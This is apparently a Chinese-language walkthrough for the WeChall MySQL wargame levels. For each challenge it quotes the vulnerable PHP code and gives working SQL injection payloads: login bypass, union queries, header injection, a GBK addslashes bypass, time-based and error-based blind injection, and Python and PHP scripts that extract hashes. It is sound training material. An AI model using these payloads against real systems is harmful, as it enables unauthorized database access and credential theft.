# wechall mysql关卡题解

特别鸣谢 Random Debug Slipper 对我的无私帮助

PS:虽然是一份题解，但是其中某些题目的解法还有些不尽人意。如有更好的思路欢迎留言评论 :)

QQ:915910623

Training: MySQL I
-----------------

* * *

最简单的注入情况，参数没有经过任何过滤就带入查询

漏洞代码：

```
function auth1_onLogin(WC_Challenge $chall, $username, $password)
{
        $db = auth1_db();

        $password = md5($password);

        $query = "SELECT * FROM users WHERE username='$username' AND password='$password'";

        if (false === ($result = $db->queryFirst($query))) {
                echo GWF_HTML::error('Auth1', $chall->lang('err_unknown'), false); # Unknown user
                return false;
        }

        # Welcome back!
        echo GWF_HTML::message('Auth1', $chall->lang('msg_welcome_back', htmlspecialchars($result['username'])), false);

        # Challenge solved?
        if (strtolower($result['username']) === 'admin') {
                $chall->onChallengeSolved(GWF_Session::getUserID());
        }

        return true;
}

```

利用语句：

```
username=admin' -- 

```

MySQL Authentication Bypass II
------------------------------

* * *

比较基础的题目，和上一题不同，username password分开来验证。通常的利用方法是使用union构造已知MD5值的查询。

漏洞代码：

```
function auth2_onLogin(WC_Challenge $chall, $username, $password)
{
        $db = auth2_db();

        $password = md5($password);

        $query = "SELECT * FROM users WHERE username='$username'";

        if (false === ($result = $db->queryFirst($query))) {
                echo GWF_HTML::error('Auth2', $chall->lang('err_unknown'), false);
                return false;
        }


        #############################
        ### This is the new check ###
        if ($result['password'] !== $password) {
                echo GWF_HTML::error('Auth2', $chall->lang('err_password'), false);
                return false;
        } #  End of the new code  ###
        #############################


        echo GWF_HTML::message('Auth2', $chall->lang('msg_welcome_back', array(htmlspecialchars($result['username']))), false);

        if (strtolower($result['username']) === 'admin') {
                $chall->onChallengeSolved(GWF_Session::getUserID());
        }

        return true;
}

```

利用语句:

```
username=wyl' union select 1,'admin','c4ca4238a0b923820dcc509a6f75849b' --  &password=1&login=Login

```

也可以直接使用mysql自带的 MD5 函数来生成 hash

```
username=wyl' union select 1,'admin',md5('1') --  &password=1&login=Login

```

No Escape
---------

* * *

一个投票的功能，使用`mysql_real_escape_string()`对参数进行了过滤，不过并不需要绕过它，因为它并不会过滤重音符（backtick）

漏洞代码：

```
function noesc_voteup($who)
{
        if ( (stripos($who, 'id') !== false) || (strpos($who, '/') !== false) ) {
                echo GWF_HTML::error('No Escape', 'Please do not mess with the id. It would break the challenge for others', false);
                return;
        }


        $db = noesc_db();
        $who = mysql_real_escape_string($who);
        $query = "UPDATE noescvotes SET `$who`=`$who`+1 WHERE id=1";
        if (false !== $db->queryWrite($query)) {
                echo GWF_HTML::message('No Escape', 'Vote counted for '.GWF_HTML::display($who), false);
        }

        noesc_stop100();
}

```

利用方式：

```
vote_for=bill` = `bill` %2b 111 where bill=0 --%20

```

当然也可以写的简短一点

```
barack`=111#

```

The Guestbook
-------------

* * *

一个留言本的程序，其中大部分参数都经过了过滤，但是IP地址直接带入insert语句，可以构造一个x-forwraded-for来实现注入

需要在insert语句中使用select子查询

漏洞代码：

```
function gbook_getIP()
{
        if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
                return $_SERVER['HTTP_X_FORWARDED_FOR'];
        }
        elseif (isset($_SERVER['HTTP_VIA'])) { 
                return $_SERVER['HTTP_VIA'];
        }
        else {
                return $_SERVER['REMOTE_ADDR'];
        }
}

```

利用方式：

头中不能使用urlencode，末尾空格会被会忽略

```
X-Forwarded-For: 127.0.0.1,8888',(select gbu_password from gbook_user where gbu_name='admin')) #

```

如果非要使用--也可以这样构造

```
X-Forwarded-For: 127.0.0.1,8888',(select gbu_password from gbook_user where gbu_name='admin')) -- a

```

MD5.SALT
--------

* * *

这道题是一道简单的注入，不过需要破解MD5，在网站上付费一下就可以了。

漏洞代码：

题目没有给出源代码

利用方式：

```
' union select password,2 from users -- 

```

Addslashes
----------

* * *

这题的参数使用了Addslashes()函数进行了过滤，使用双字节绕过即可。

漏洞代码：

```
function asvsmysql_login($username, $password)
{
        $username = addslashes($username);
        $password = md5($password);

        if (false === ($db = gdo_db_instance('localhost', ADDSLASH_USERNAME, ADDSLASH_PASSWORD, ADDSLASH_DATABASE, GWF_DB_TYPE, 'GBK'))) {
                return htmlDisplayError('Can`t connect to database.');
        }

        $db->setLogging(false);
        $db->setEMailOnError(false);

        $query = "SELECT username FROM users WHERE username='$username' AND password='$password'";

        if (false === ($result = $db->queryFirst($query))) {
                return htmlDisplayError('Wrong username/password.');
        }

        if ($result['username'] !== 'Admin') {
                return htmlDisplayError('You are logged in, but not as Admin.');
        }

        return htmlDisplayMessage('You are logged in. congrats!');
}

```

利用方式：

使用limit猜测一下，admin的位置

```
username=Admin%bf' union select username from users limit 1,1 -- 

```

或者直接构造一个admin出来

```
username=%b3%27+union+select+Char(65,100,109,105,110)/*

```

当然这些方法，主要是为了绕过单引号，还有一些有趣的利用

```
username=%bf%27 OR CONV(username,36,10) = 17431871#

```

Blinded by the light
--------------------

* * *

盲注，参数没用经过过滤，猜测一个32位的hash，但是要求在128次之内猜解出来，使用二分即可。

漏洞代码：

```
function blightVuln($password)
{
        # Do not mess with other sessions!
        if ( (strpos($password, '/*') !== false) || (stripos($password, 'blight') !== false) )
        {
                return false;
        }

        $db = blightDB();
        $sessid = GWF_Session::getSession()->getID();
        $query = "SELECT 1 FROM (SELECT password FROM blight WHERE sessid=$sessid) b WHERE password='$password'";
        return $db->queryFirst($query) !== false;
}

```

利用脚本：

常规的二分盲注

```
import urllib
import urllib2
def doinject(payload):
    url = 'http://www.wechall.net/challenge/blind_light/index.php'
    values = {'injection':payload,'inject':'Inject'}
    data = urllib.urlencode(values)
    #print data
    req = urllib2.Request(url, data)
    req.add_header('cookie','WC=7205526-10787-ZSOZPXjj8gf4BE7K')
    response = urllib2.urlopen(req)
    the_page = response.read()
    if (the_page.find("Welcome back")>0):
        return True
    else:
        return False


wordlist = "0123456789ABCDEF"
res = ""
for i in range(1,33):
    s=0
    t=15
    while (s<t):
        if (t-s==1):
            if doinject('\' or substring(password,'+str(i)+',1)=\''+wordlist[t]+'\' -- '):
                m=t
                break
            else:
                m=s
                break
        m=(s+t)/2
        if doinject('\' or substring(password,'+str(i)+',1)>\''+wordlist[m]+'\' -- '):
            s=m+1
            print wordlist[s]+":"+wordlist[t]
        else:
            t=m
            print wordlist[s]+":"+wordlist[t]
    res = res+wordlist[m]
    print res

```

使用正则表达式的盲注

```
$sUrl = 'http://www.wechall.net/challenge/blind_light/index.php';
$sPost = 'inject=Inject&injection=';
$sCharset = 'ABCDEF0123456789';


/* for every character */
for ($i=0, $hash=''; $i<32; ++$i) {
        $ch = $sCharset;

        do {
                $ch1 = substr($ch, 0, intval(strlen($ch)/2));
                $ch2 = substr($ch, intval(strlen($ch)/2));

                $p = $sPost.'absolutelyimpossible\' OR 1=(SELECT 1 FROM blight WHERE password REGEXP \'^'.$hash.'['.$ch1.']\' AND sessid=xxx) AND \'1\'=\'1';
                $res = libHTTP::POST($sUrl, $p);

                if (strpos($res['content'], 'Your password is wrong') === false)
                        $ch = $ch1;
                else 
                        $ch = $ch2;

        } while (strlen($ch) > 1);

        $hash .= $ch;
        echo "\rhash: ".$hash;
}

```

Blinded by the lighter
----------------------

* * *

这题和上题相同，只不过把次数减少成为33次

漏洞代码：

```
function blightVuln($password)
{
        # Do not mess with other sessions!
        if ( (strpos($password, '/*') !== false) || (stripos($password, 'blight') !== false) )
        {
                return false;
        }

        $db = blightDB();
        $sessid = GWF_Session::getSessSID();
        $query = "SELECT 1 FROM (SELECT password FROM blight WHERE sessid=$sessid) b WHERE password='$password'";
        return $db->queryFirst($query) !== false;
}

```

利用方式：

使用基于时间的注入来判断字符ascii码

```
' or benchmark(ord(substr(password,1,1))*1000000,MD5(1))

```

这样做可以提高一点精确度

```
' or sleep(ord(substr(password,1,1)))

```

ps.这题使用这种方法写的脚本，在精度上会出现问题，如果有什么好的思路请留言告知~~~~

Light in the Darkness
---------------------

* * *

上面两题的加强版，只允许2次查询。不过是返回错误信息的盲注。可以使用双查询报错。

漏洞代码：

```
function blightVuln($password)
{
        # Do not mess with other sessions!
        if ( (strpos($password, '/*') !== false) || (stripos($password, 'blight') !== false) )
        {
                return false;
        }

        $db = blightDB();
        $sessid = GWF_Session::getSessSID();
        $query = "SELECT 1 FROM (SELECT password FROM blight WHERE sessid=$sessid) b WHERE password='$password'";
        return $db->queryFirst($query) !== false;
}

```

利用方式:

```
1' or (select count(*) from information_schema.tables group by concat(password,floor(rand(0)*2))) -- 

```

我其实对这种报错方式的原理很好奇，也很不解，有感兴趣的同学欢迎指教。

下面是我对这题的几点疑惑：

特别是使用用户变量时，反应也很神奇，比如这题的另一种解法，不明白其中的原理。

```
 '||(select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2))||'

```

我当时设想出这样一种解法，但是发现包含有@xxxx的语句都不会触发这个bug，除非@xxxx是纯数字。很迷茫。

```
' or (@lanlan:=password) or (select 1 from(select count(*),concat(@lanlan,floor(rand(0)*2))x from information_schema.tables group by x)a) -- 

```

Are you blind?
--------------

* * *

这题也是一道盲注，可是不管对错返回的结果一样。可以使用order by报错的方法来盲注。

漏洞代码：

```
function blightVuln(WC_Challenge $chall, $password, $attempt)
{
        # Do not mess with other sessions!
        if ( (strpos($password, '/*') !== false) || (stripos($password, 'blight') !== false) )
        {
                return $chall->lang('mawekl_blinds_you', array($attempt));
        }

        # And please, no timing attempts!
        if ( (stripos($password, 'benchmark') !== false) || (stripos($password, 'sleep') !== false) )
        {
                return $chall->lang('mawekl_blinds_you', array($attempt));
        }

        $db = blightDB();
        $sessid = GWF_Session::getSessSID();
        $query = "SELECT 1 FROM (SELECT password FROM blight WHERE sessid=$sessid) b WHERE password='$password'";
        return $db->queryFirst($query) ? 
                $chall->lang('mawekl_blinds_you', array($attempt)) :
                $chall->lang('mawekl_blinds_you', array($attempt)) ;
}

```

利用语句：

```
injection=' or  if(1,1,(select 1 union select 2)) = 1 -- &inject=Inject

```

Order By Query
--------------

* * *

这是一个在order by后面的注入，可以直接使用双查询报错来解决。也可以使用盲注的手法猜测。

漏洞代码：

```
function addslash2_sort($orderby, $dir)
{
        if (false === ($db = addslash2_get_db())) {
                return false;
        }
        static $whitelist = array(1, 3, 4, 5);
        static $names = array(1 => 'Username', 3 => 'Apples', 4 => 'Bananas', 5 => 'Cherries');

        $dir = GDO::getWhitelistedDirS($dir, 'DESC');

        if (!in_array($orderby, $whitelist)) {
                return htmlDisplayError('Error 1010101: Not in whitelist.');
        }

        $orderby = $db->escape($orderby);

        $query = "SELECT * FROM users ORDER BY $orderby $dir LIMIT 10";
        if (false === ($rows = $db->queryAll($query))) {
                return false;
        }

        $headers = array(
                array('#'),
                array('Username', '1', 'ASC'),
                array('Apples', '3', 'DESC'),
                array('Bananas', '4', 'DESC'),
                array('Cherries', '5', 'DESC'),
        );
        echo '<div class="box box_c">'.PHP_EOL;
        echo '<table>'.PHP_EOL;
        echo GWF_Table::displayHeaders1($headers, GWF_WEB_ROOT.'challenge/order_by_query/index.php?by=%BY%&dir=%DIR%');
        $i = 1;
        foreach ($rows as $row)
        {
                echo GWF_Table::rowStart();
                echo sprintf('<td align="right">%d</td>', $i++);
                echo sprintf('<td>%s</td>', $row['username']);
                echo sprintf('<td align="right">%s</td>', $row['apples']);
                echo sprintf('<td align="right">%s</td>', $row['bananas']);
                echo sprintf('<td align="right">%s</td>', $row['cherries']);
                echo GWF_Table::rowEnd();
        }
        echo '</table>'.PHP_EOL;
        echo '</div>'.PHP_EOL;
}

```

利用方式：

```
by=5 and (select 1 from(select count(*),concat((select password from users where username=0x41646d696e),0x3a,floor(rand(0)*2))x from information_schema.tables group by x)a) --

```

盲注脚本

```
<?php
$curl = curl_init();
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_HEADER, 0);
curl_setopt($curl, CURLOPT_COOKIE, 'WC4_SID=xxxxxxxxxxxxxxxxxxxxxxx');
$charset = 'ABCDEF0123456789';
$hash = '';
for($i=0;$i<32;$i++)
{
        $strona = '';
        $index=0;
        for($j=0;strpos($strona,'10</td><td>Admin') === false;$j++)
        {
                curl_setopt($curl, CURLOPT_URL, 'http://www.wechall.net/challenge/order_by_query/index.php?by=3,%20CASE%20username%20WHEN%200x41646d696e%20THEN%202-%28password%20REGEXP%200x5e'.$hash.dechex(ord($charset[$index++])).'%29%20ELSE%202%20END--');
                $strona = curl_exec ($curl);
        }
        $hash .= ''.dechex(ord($charset[--$index]));
}
curl_close($curl);
echo $hash;
?>

```

Table Names
-----------

* * *

猜测表名和数据库名的题目，直接查询information_schema即可

漏洞代码：

没有给出源代码

利用方式：

得到表名

```
username=wyl' union select 1,2,table_name from information_schema.columns where column_name='username' limit 1,1 -- 

```

得到数据库名

```
username=wyl' union select 1,2,database() -- 

```

Table Names II
--------------

这道题同样是猜测，数据库名和表名，不过很多关键词都被过滤了。查到mysql的版本，根据文档找information_schema里面的表， 一个一个试一下就行了。

漏洞代码：

```
<?php
$secret = require('secret.php');
chdir('../../../');
define('GWF_PAGE_TITLE', 'Table Names II');
require_once('challenge/html_head.php');
require(GWF_CORE_PATH.'module/WeChall/solutionbox.php');

if (false === ($chall = WC_Challenge::getByTitle(GWF_PAGE_TITLE)))
{
        $chall = WC_Challenge::dummyChallenge(GWF_PAGE_TITLE, 6, 'challenge/nurfed/more_table_names/index.php', $secret['flag']);
}
$chall->showHeader();
$chall->onCheckSolution();

if (false !== Common::getGet('login'))
{
        $username = Common::getGetString('username', '');
        $password = Common::getGetString('password', '');

        if (preg_match('/statistics|tables|columns|table_constraints|key_column_usage|partitions|schema_privileges|schemata|database|schema\(\)/i', $username.$password))
        {
                echo GWF_HTML::error(GWF_PAGE_TITLE, $chall->lang('on_match'));
        }
        else
        {
                if (false === ($db = gdo_db_instance($secret['host'], $secret['username'], $secret['password'], $secret['database'])))
                {
                        die('Database error.');
                }

                $db->setVerbose(false);
                $db->setLogging(false);
                $db->setEMailOnError(false);


                $query = "SELECT * FROM {$secret['database']}.{$secret['table_name']} WHERE username='$username' AND password='$password'";
                if (false === ($result = ($db->queryFirst($query, false))))
                {
                        echo GWF_HTML::error(GWF_PAGE_TITLE, $chall->lang('on_login_fail'));
                }
                else
                {
                        echo GWF_HTML::message(GWF_PAGE_TITLE, $chall->lang('on_logged_in', array(GWF_HTML::display($result['username']), GWF_HTML::display($result['message']))));
                }
        }
}

?>
<div class="box box_c">
<form action="challenge.php" method="get">
<div><?php echo $chall->lang('username'); ?>: <input type="text" name="username" value="" /></div>
<div><?php echo $chall->lang('password'); ?>: <input type="text" name="password" value="" /></div>
<div><input type="submit" name="login" value="<?php echo $chall->lang('login'); ?>" /></div>
</form>
</div>
<?php
echo $chall->copyrightFooter();
require_once('challenge/html_foot.php');

```

利用方式：

```
' union select 1,2,info from information_schema.processlist-- -

```

Credit Card Challenge Pwned!
----------------------------

* * *

这题描述特别长，看了半天就是发送一个页面给管理员，csrf+injection。